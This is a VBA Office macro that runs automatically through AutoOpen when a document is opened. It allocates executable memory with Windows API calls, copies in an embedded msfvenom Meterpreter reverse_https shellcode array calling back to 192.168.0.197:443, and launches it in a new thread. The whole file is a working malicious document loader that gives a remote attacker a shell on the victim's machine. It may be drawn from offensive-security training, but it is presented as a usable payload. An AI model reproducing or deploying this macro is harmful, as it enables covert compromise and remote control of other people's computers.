Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByValSecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr



Function exec_payload()
    Dim buf As Variant
    Dim addr As LongPtr
    
    '
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.197 LPORT=443 EXITFUNC=thread -f vbapplication
    'Payload size: 585 bytes
    'Final size of vbapplication file: 2014 bytes
    '
    
    buf = Array(232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 49, 255, 139, 114, 40, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 88, 32, 80, 1, 211, 139, 72, 24, 133, 201, 116, 60, 49, 255, _
    73, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
    104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, _
    0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 187, 1, 0, 0, 232, 13, 1, 0, 0, 47, 79, 51, 51, 109, 117, 108, 89, 81, 52, 119, 67, 88, 70, 74, 89, 86, 121, 78, 104, 48, 86, 103, 103, 97, 104, 79, 107, 100, 111, 76, 87, 49, 101, 95, 79, 86, 102, 119, 119, 105, 52, 104, 45, 99, 98, 122, 79, 98, 45, 74, 112, 106, 72, 52, 45, _
    107, 45, 54, 72, 106, 71, 111, 77, 103, 110, 104, 70, 113, 117, 70, 83, 49, 90, 71, 56, 121, 101, 108, 104, 108, 65, 52, 86, 73, 73, 116, 108, 114, 77, 49, 70, 101, 117, 51, 66, 107, 67, 99, 120, 48, 54, 90, 56, 83, 67, 103, 112, 107, 68, 53, 72, 122, 104, 109, 108, 109, 120, 52, 79, 69, 121, 112, 114, 88, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, _
    83, 104, 0, 50, 232, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 74, 0, 0, 0, 106, _
    64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 48, 46, 49, 57, 55, 0, 187, 224, 29, 42, 10, 104, 166, _
    149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    
    ' UBound calculates size of buf, &H3000 means that memory is alocated and available/reserved, &H40 means memory is readable writable and executable
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    Dim data As Long
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function




    


Sub AutoOpen()
    exec_payload
End Sub
